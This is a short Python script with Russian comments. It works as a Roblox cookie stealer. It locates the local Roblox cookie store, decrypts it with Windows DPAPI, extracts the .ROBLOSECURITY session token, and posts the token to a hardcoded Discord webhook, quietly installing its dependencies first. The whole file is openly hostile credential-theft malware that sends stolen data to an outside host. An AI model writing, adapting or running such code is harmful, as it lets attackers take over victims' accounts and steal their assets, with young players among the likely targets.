import os, sys, subprocess, json, base64, time, requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1404843876178591774/TnoJ98WnvsxVGHWnyKhaF32Bp-upIINshDb2kTjJZx3e6bfPDa33p3WkXId8Z2NjHvnb"

# Автоматическая установка библиотек
def install_libs():
    try:
        import win32crypt, requests
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32", "requests", "--quiet"])

# Поиск и кража куки
def steal_cookie():
    path = os.path.join(os.getenv('LOCALAPPDATA'), 'Roblox', 'LocalStorage', 'RobloxCookies.dat')
    if not os.path.exists(path):
        return None
    
    try:
        data = json.load(open(path))
        decrypted = win32crypt.CryptUnprotectData(base64.b64decode(data['CookiesData']), None, None, None, 0)[1].decode('utf-8', errors='ignore')
        
        start = decrypted.find('_|WARNING:-')
        if start == -1:
            return None
        
        end = decrypted.find('\n', start)
        if end == -1:
            end = len(decrypted)
        
        return decrypted[start:end]
    except:
        return None

# Отправка на вебхук
def send_to_webhook(cookie):
    if not cookie:
        return
    payload = {
        "content": f"**ROBLOX COOKIE**\n```\n{cookie}\n```"
    }
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except:
        pass

# Главная функция
def main():
    install_libs()
    cookie = steal_cookie()
    send_to_webhook(cookie)
    print("Готово. Скрипт завершён.")

if __name__ == "__main__":
    main()